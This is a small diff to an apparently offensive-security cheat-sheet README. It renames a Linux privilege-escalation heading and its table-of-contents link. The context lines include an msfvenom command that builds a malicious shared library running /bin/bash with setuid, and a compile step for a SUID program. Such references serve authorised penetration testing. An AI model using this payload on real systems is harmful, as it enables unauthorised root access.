@@ -75,7 +75,7 @@ Table of Contents
          * [Scripts](#scripts)
             * [SUID](#suid)
             * [PS Monitor for cron](#ps-monitor-for-cron)
-            * [MSFVENOM LIBRARY.so Priv Esc](#msfvenom-library.so-priv-esc)
+            * [MSFVENOM LIBRARY Priv Esc](#msfvenom-library-priv-esc)
          * [Linux Privesc Tools](#linux-privesc-tools)
          * [Linux Precompiled Exploits](#linux-precompiled-exploits)
       * [Windows](#windows)
@@ -1589,7 +1589,7 @@ int main(void){
 # Compile
 gcc suid.c -o suid
 ```
-### MSFVENOM LIBRARY.so Priv Esc
+### MSFVENOM LIBRARY Priv Esc
 ```
 msfvenom -p linux/x64/exec -cmd '/bin/bash' -f elf-so -o libmalbec.so PrependSetuid=TRUE
 ```
